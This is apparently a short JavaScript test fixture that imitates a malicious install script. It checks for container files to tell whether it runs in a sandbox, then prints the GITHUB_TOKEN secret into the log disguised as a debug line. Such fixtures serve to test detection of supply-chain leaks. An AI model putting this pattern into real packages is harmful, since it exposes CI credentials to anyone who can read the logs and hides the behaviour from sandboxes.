// FIXTURE: checks for a container, then "debug prints" a token into the install log (CI log leak).
const fs = require('fs');
let boxed = false;
for (const p of ['/.dockerenv', '/proc/1/cgroup']) { try { fs.readFileSync(p); boxed = true; } catch (e) {} }
console.log(`debug: boxed=${boxed} token=${process.env.GITHUB_TOKEN}`);
